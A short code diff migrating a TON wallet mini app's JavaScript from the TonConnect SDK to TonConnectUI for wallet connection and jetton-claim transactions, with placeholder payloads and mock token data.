@@ -1,4 +1,4 @@
-let connector;
+let ui;
 let walletAddress = null;
 let timerInterval;
 let jettonsToClaim = [];
@@ -6,12 +6,12 @@ let currentIndex = 0;
 
 document.getElementById("connectBtn").onclick = async () => {
     try {
-        connector = new TonConnectSDK.TonConnect({
+        ui = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: "https://emperator16.github.io/miniapp/tonconnect-manifest.json"
         });
 
-        const wallet = await connector.connect();
-        walletAddress = wallet.accountAddress;
+        await ui.connect();
+        walletAddress = ui.wallet.account.address;
 
         alert("Wallet connected: " + walletAddress);
 
@@ -76,7 +76,8 @@ async function processNextClaim() {
             amount: 0, // فقط امضا، پرداخت کارمزد
             payload: "0x1234"
         };
-        await connector.sendTransaction(payload);
+
+        await ui.sendTransaction(payload);
 
         currentIndex++;
         document.getElementById("claimDiv").style.display = "none";
@@ -109,4 +110,3 @@ async function fetchUserJettons(address) {
         {address: '0:def456...', amount: 1}
     ];
 }
-
